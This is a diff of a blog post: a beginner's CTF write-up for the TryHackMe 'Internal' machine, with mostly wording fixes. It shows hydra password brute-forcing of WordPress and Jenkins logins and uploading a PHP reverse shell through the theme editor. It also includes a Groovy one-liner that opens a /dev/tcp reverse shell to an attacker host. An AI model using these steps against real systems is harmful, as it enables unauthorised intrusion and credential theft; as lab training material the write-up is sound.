@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Internal writeup
+title: Internal Writeup
 hide_title: false
 color: grey
 permalink: /ctf/thm-internal
@@ -15,7 +15,7 @@ excerpt_separator: <!--more-->
 **Difficulty:** Hard
 <!--more-->
 ## Intro
-Namaste everyone. This is my first [writeup](http://writeup.So).  So if there are any mistakes please feel free to reach out to me. Also thanks to TheMayor for creating this box. As a begineer into ctfs i really enjoyed solving this box.
+Namaste everyone. This is my first writeup. So if there are any mistakes please feel free to reach out to me. Also thanks to **TheMayor** for creating this box. As a begineer into ctf's I really enjoyed solving this box.
 
 Before we get started i wanna shed some light into the type of box we are dealing and short description of the attack. To get the userflag you need to exploit the wordpress site running at the specific directory. For root, you need to enumerate, find the local jenkins server bruteforce it and get a shell where you can get info for creds to ssh into root user.
 
@@ -23,9 +23,9 @@ Before we get started i wanna shed some light into the type of box we are dealin
 
 ## Scanning and Enumeration
 
-Before getting started put `internal.thm` in your `/etc/hosts` 
+Before we begin put `internal.thm` in your `/etc/hosts` 
 
-After the box is deployed lets scan the ip to see open ports
+After the box is deployed let's scan the ip to see open ports
 ```bash
 nmap -sC -sV -T4 -p- -v -oN nmap/fullscan internal.thm
 
@@ -54,18 +54,18 @@ Looking at the site its a default apache page
 
 <a href="/assets/img/thm/internal/apache.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/apache.png"></a>
 
-Nothing interesting came up so i resorted to my directory bruteforcing. Let's fireup our gobuster to see the directories of the site
+Looking at the page nothing interesting came up so i resorted to my directory bruteforcing. Let's fireup our gobuster to see the directories of the site
 
 ```bash
 gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust
 ```
 <a href="/assets/img/thm/internal/gobuster.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/gobuster.png"></a>
 
-There's a blog directory so lets see what it contains
+There's a blog directory so let's see what it contains
 
 <a href="/assets/img/thm/internal/wp.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp.png"></a>
 
-Its a wordpress website. I looked into the site and there's a classic hello world page. The first thing that came into mind is to run wpscan to see if there is any vulnerabilites of this wordpress site and enumerate the wordpress site. Its a great tool.
+Its a wordpress website. Oh yea! it's a classic hello world page. The first thing that came into mind is to run wpscan to see if there is any vulnerabilites of this wordpress site and enumerate the wordpress site. Its a great tool.
 
 It comes preinstalled if you are using kali otherwise you can clone it from [github](https://github.com/wpscanteam/wpscan)
 
@@ -80,7 +80,7 @@ Use `-h` for help
 
 <a href="/assets/img/thm/internal/wpusers.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpusers.png"></a>
 
-Looking at the results the Wordpress version is `5.4.2`  and it found one user admin. We know the username. At this moment i only had a username so lets bruteforce with hydra.
+Looking at the results the Wordpress version is `5.4.2`  and it found one user `admin`. We know the username. At this moment i only had a username so lets bruteforce with hydra.
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -V -f http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fi[32/32$
@@ -88,15 +88,17 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -V -f http-form-
 ```
 <a href="/assets/img/thm/internal/hydralogin.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/hydralogin.png"></a>
 
-So it found the password. I don't want to spoil the password if you were looking for hints. Let's login inside `/blog/wp-admin`
+So it found the password. I don't want to spoil if you were looking for hints. Let's login inside `/blog/wp-admin`
+
+***
 
 ## Exploitation
 
 <a href="/assets/img/thm/internal/wp_dashboard.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp_dashboard.png"></a>
 
-The site is pretty new. Let's get a reverse shell so we can go deep inside the box. There are multiple ways to get reverse shell but we have the credentials so the one we are using is uploading our malicious code in `wp_theme`.To get the connection you need to upload the php reverse shell to the site. We can grab the php reverse shell from pentestmonkey. 
+The site is pretty new. Let's get a reverse shell so we can go deep inside the box. There are multiple ways to get reverse shell but we have the credentials so the one we are using is uploading our malicious code in `wp_theme`.To get the connection you need to upload the php reverse shell to the site. We can grab the php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). 
 
-Go to `Apperance>Theme Editor > 404 template >` and paste the code there. Replace the ip with your attacker ip address and open up a listener in your machine.
+Go to `Apperance>Theme Editor > 404 template >` and paste the code there. Replace the `ip` and `port` with your attacker ip and open up a listener in your machine.
 
 <a href="/assets/img/thm/internal/wp-theme.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp-theme.png"></a>
 
@@ -105,7 +107,8 @@ Update file and browse the following URL to run the injected php code.
 `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`
 
 <a href="/assets/img/thm/internal/wpreverse.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpreverse.png"></a>
-Once inside at first i did'nt looked at all the folders properly. Further looking inside there's a file in the `/opt`  named `wp-save.txt`
+
+Once inside at first i didn't looked at all the folders properly. Further looking inside there's a file in the `/opt`  named `wp-save.txt`
 
 ```console
 www-data@internal:/opt$ ls -la
@@ -143,8 +146,8 @@ jenkins.txt  snap  user.txt
 ```
 ***
 
-## Priviledge Escalation
-After enumerating this box i found that it has a internal port `8080` open. it didnt pop out in our nmap scan becuase it can be accessed only by localhost. We need to pivot to reach to that port.
+## Privilege Escalation
+After enumerating this box i found that it has a internal port `8080` open. It didn't pop out in our nmap scan becuase it can be accessed only by localhost. We need to pivot to reach to that port.
 
 ```console
 aubreanna@internal:~$ netstat -ntl
@@ -182,7 +185,7 @@ All tcp connections to port 8000 will be redirected to localhost at port 8080. L
 
 <a href="/assets/img/thm/internal/jenkins.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/jenkins.png"></a>
 
-It's a jenkins server which is used to integrate and automate your product development and testing processes.But it's protected with login. I tried default creds and didnt work out. So we have to bruteforce it. Msfconsole has a auxillary to bruteforce it since the box mentions it can be solved without metsploit so we will use hydra.
+It's a jenkins server which is used to integrate and automate your product development and testing processes. But it's protected with login. I tried default creds and didnt work out. So we have to bruteforce it. Msfconsole has a auxillary to bruteforce it, Since the box mentions it can be solved without metasploit so we will use hydra.
 
 The default username for jenkins is `admin` . If it won't work out then we do have other usernames `aubreanna`, `bill` to try . For now let's try with `admin`
 
@@ -212,7 +215,7 @@ We can put Groovy script and run to execute it. Jenkins supports building Java p
 
 ```java
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.4.0.140/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
@@ -243,7 +246,7 @@ Let's ssh into root
 ssh root@internal.thm
 ```
 
-let's list the files `ls -l`
+List the files using `ls -l`
 
 ```console
 root@internal:~# ls -l
@@ -260,7 +263,7 @@ Okay here's the final flag for the box inside `root.txt`
 ## Conclusion
 
 Thanks for reading folks! I really enjoyed this box as it required manual enumeration rather than using automated tools for priviledge escalation. 
-I will keep posting writeup boxes i solve through this platform in coming days.
+I will keep posting writeups through this platform in upcoming days.
 
 ~ickl0cc
 
